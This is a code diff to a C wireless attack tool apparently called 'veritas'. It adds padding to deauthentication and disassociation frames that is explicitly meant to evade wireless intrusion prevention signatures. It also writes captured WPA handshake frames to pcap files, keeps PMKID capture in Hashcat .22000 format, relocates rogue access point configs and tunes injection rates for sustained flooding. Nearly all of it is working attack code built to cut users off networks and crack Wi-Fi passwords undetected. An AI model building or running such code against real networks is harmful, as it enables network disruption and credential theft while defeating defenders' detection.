@@ -337,6 +337,25 @@ typedef struct {
   int len;
 } pkt_t;
 
+/* PCAP Global Header (for .pcap files) */
+typedef struct __attribute__((packed)) {
+  uint32_t magic_number;  /* magic number (0xa1b2c3d4) */
+  uint16_t version_major; /* major version number */
+  uint16_t version_minor; /* minor version number */
+  int32_t  thiszone;      /* GMT to local correction */
+  uint32_t sigfigs;       /* accuracy of timestamps */
+  uint32_t snaplen;       /* max length of captured packets, in octets */
+  uint32_t network;       /* data link type (105 for 802.11) */
+} pcap_hdr_t;
+
+/* PCAP Packet Header */
+typedef struct __attribute__((packed)) {
+  uint32_t ts_sec;   /* timestamp seconds */
+  uint32_t ts_usec;  /* timestamp microseconds */
+  uint32_t incl_len; /* number of octets of packet saved in file */
+  uint32_t orig_len; /* actual length of packet */
+} pcaprec_hdr_t;
+
 /* ============================================================
  *               UTILITIES
  * ============================================================ */
@@ -685,6 +704,15 @@ static int mk_deauth(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   uint16_t r = htole16(reason); /* [FIX 41] */
   memcpy(b + o, &r, 2);
   o += 2;
+
+  /* [UPGRADE] WIPS Evasion Padding (IE 221 - Vendor Specific) */
+  /* Mimics Microsoft WMM/WME parameter to bypass static size signatures */
+  b[o++] = 221;
+  b[o++] = 7;
+  b[o++] = 0x00; b[o++] = 0x50; b[o++] = 0xf2; /* Microsoft OUI */
+  b[o++] = 0x02; /* OUI Type */
+  b[o++] = 0x01; b[o++] = 0x01; b[o++] = 0x80; /* Dummy data */
+
   return o;
 }
 
@@ -696,6 +724,14 @@ static int mk_deauth_rev(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   uint16_t r = htole16(reason);
   memcpy(b + o, &r, 2);
   o += 2;
+
+  /* [UPGRADE] WIPS Evasion Padding (IE 221 - Vendor Specific) */
+  b[o++] = 221;
+  b[o++] = 7;
+  b[o++] = 0x00; b[o++] = 0x50; b[o++] = 0xf2; /* Microsoft OUI */
+  b[o++] = 0x02; /* OUI Type */
+  b[o++] = 0x01; b[o++] = 0x01; b[o++] = 0x80; /* Dummy data */
+
   return o;
 }
 
@@ -707,6 +743,14 @@ static int mk_disassoc(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   uint16_t r = htole16(reason);
   memcpy(b + o, &r, 2);
   o += 2;
+
+  /* [UPGRADE] WIPS Evasion Padding (IE 221 - Vendor Specific) */
+  b[o++] = 221;
+  b[o++] = 7;
+  b[o++] = 0x00; b[o++] = 0x50; b[o++] = 0xf2; /* Microsoft OUI */
+  b[o++] = 0x02; /* OUI Type */
+  b[o++] = 0x01; b[o++] = 0x01; b[o++] = 0x80; /* Dummy data */
+
   return o;
 }
 
@@ -2049,29 +2093,57 @@ static void *capture_thread(void *arg) {
       if (a->target_bssid[0] && memcmp(d->a3, target_bss, 6) != 0)
         break; /* not our target */
 
-      /* [FIX 23] Validate this is M1: check EAPOL Key Info ACK bit */
+      /* [UPGRADE] Check if it's an EAPOL packet (any of M1-M4) */
       /* EAPOL Key starts after LLC/SNAP (8 bytes) + EAPOL header (4 bytes) */
       ssize_t eapol_start = i + 2; /* past 0x888E */
       if (eapol_start + 4 + 2 < n) {
-        /* Key Info is at EAPOL body offset +1 (version=1 byte, type=1, len=2,
-         * then key_type=1, key_info=2) */
-        /* Actually: EAPOL header is ver(1)+type(1)+len(2) = 4 bytes
-           Then Key descriptor: type(1) + key_info(2) */
-        ssize_t key_info_off =
-            eapol_start + 4 + 1; /* past EAPOL hdr + descriptor type */
-        if (key_info_off + 2 <= n) {
-          uint16_t key_info;
-          memcpy(&key_info, buf + key_info_off, 2);
-          key_info = be16toh(key_info); /* Key Info is big-endian */
-          /* M1 has ACK=1 (bit 7), MIC=0 (bit 8), Install=0 (bit 6) */
-          if (!(key_info & 0x0080))
-            break; /* no ACK → not M1 */
-          if (key_info & 0x0100)
-            break; /* MIC set → M2/M3/M4 */
+        /* If it's an EAPOL packet, we save it to our PCAP file */
+        char pcap_name[128];
+        time_t now = time(NULL);
+        struct tm *tm = localtime(&now);
+        snprintf(pcap_name, sizeof(pcap_name),
+                 "./out/veritas_handshake_%04d%02d%02d.pcap", tm->tm_year + 1900,
+                 tm->tm_mon + 1, tm->tm_mday);
+
+        FILE *fp = fopen(pcap_name, "ab"); /* Append mode (binary) */
+        if (fp) {
+          /* Check if file is empty, write global header if it is */
+          fseek(fp, 0, SEEK_END);
+          if (ftell(fp) == 0) {
+            pcap_hdr_t ph = {
+                .magic_number = 0xa1b2c3d4,
+                .version_major = 2,
+                .version_minor = 4,
+                .thiszone = 0,
+                .sigfigs = 0,
+                .snaplen = 65535,
+                .network = 105 /* IEEE 802.11 */
+            };
+            fwrite(&ph, sizeof(ph), 1, fp);
+          }
+
+          struct timeval pcap_tv;
+          gettimeofday(&pcap_tv, NULL);
+          
+          /* The packet we received from raw socket might not have a radiotap header 
+             if it's not a monitor interface (unlikely here, but good to be safe). 
+             We write exactly what we captured (which includes the Radiotap). */
+          pcaprec_hdr_t pr = {
+              .ts_sec = pcap_tv.tv_sec,
+              .ts_usec = pcap_tv.tv_usec,
+              .incl_len = n,
+              .orig_len = n
+          };
+
+          fwrite(&pr, sizeof(pr), 1, fp);
+          fwrite(buf, 1, n, fp);
+          fclose(fp);
+          
+          fprintf(stderr, "  " C_GREEN "[PCAP]" RST " Saved EAPOL frame to %s\n", pcap_name);
         }
       }
 
-      /* [FIX 2] Search for PMKID KDE: DD 14 00 0F AC 04 <16 bytes> */
+      /* [FIX 2] Search for PMKID KDE (for Hashcat .22000 output as bonus) */
       for (ssize_t j = i; j < n - 22; j++) {
         if (buf[j] == 0xDD && buf[j + 1] == 0x14 && buf[j + 2] == 0x00 &&
             buf[j + 3] == 0x0F && buf[j + 4] == 0xAC &&
@@ -2094,7 +2166,7 @@ static void *capture_thread(void *arg) {
           time_t now = time(NULL);
           struct tm *tm = localtime(&now);
           snprintf(fname, sizeof(fname),
-                   "/tmp/veritas_pmkid_%04d%02d%02d.22000", tm->tm_year + 1900,
+                   "./out/veritas_pmkid_%04d%02d%02d.22000", tm->tm_year + 1900,
                    tm->tm_mon + 1, tm->tm_mday);
           FILE *fp = fopen(fname, "a");
           if (fp) {
@@ -2161,7 +2233,7 @@ static void start_rogue(const config_t *c, const target_ap_t *t) {
   }
 
   char path[128];
-  snprintf(path, sizeof(path), "/tmp/veritas_rogue_%ld.conf", (long)time(NULL));
+  snprintf(path, sizeof(path), "./out/veritas_rogue_%ld.conf", (long)time(NULL));
   FILE *fp = fopen(path, "w");
   if (!fp)
     return;
@@ -2400,7 +2472,7 @@ static int scan_aps(const char *iface, int dur, target_ap_t *aps, int max,
                     const char *band) {
   int cnt = 0;
   char tmpdir[128];
-  snprintf(tmpdir, sizeof(tmpdir), "/tmp/vrt_scan_XXXXXX");
+  snprintf(tmpdir, sizeof(tmpdir), "./out/vrt_scan_XXXXXX");
   if (!mkdtemp(tmpdir))
     return 0;
   char pfx[200];
@@ -4097,15 +4169,21 @@ static void *stress_injector_thread(void *arg) {
 
     if (d_sent + d_fail > 100) { /* only adjust if we have enough sample size */
       double fail_rate = (double)d_fail / (double)(d_sent + d_fail);
-      if (fail_rate > 0.05) {
-        /* High failure rate: Buffer Bloat detected. Additive Increase (Slow
-         * Down) */
+      
+      /* [UPGRADE] Watchdog Evasion (Intel 8265/8275 adaptation) */
+      if (fail_rate > 0.30) {
+        /* Severe Buffer Bloat: Ring buffer is jammed.
+         * Enforce immediate hardware cooldown to prevent firmware crash/monitor mode drop. */
+        usleep_precise(0.1); /* 100ms hard pause to drain DMA */
+        base_sleep *= 2.0;   /* Aggressive multiplicative backoff */
+        if (base_sleep > 0.1) base_sleep = 0.1;
+      } else if (fail_rate > 0.05) {
+        /* High failure rate: Buffer Bloat detected. Additive Increase (Slow Down) */
         base_sleep += 0.0005;
         if (base_sleep > 0.1)
           base_sleep = 0.1; /* Max sleep cap */
       } else if (fail_rate == 0.0) {
-        /* Zero failures: Hardware can take more. Multiplicative Decrease (Speed
-         * Up) */
+        /* Zero failures: Hardware can take more. Multiplicative Decrease (Speed Up) */
         base_sleep *= 0.95;
         if (base_sleep < 0.00001)
           base_sleep = 0.00001; /* Floor */
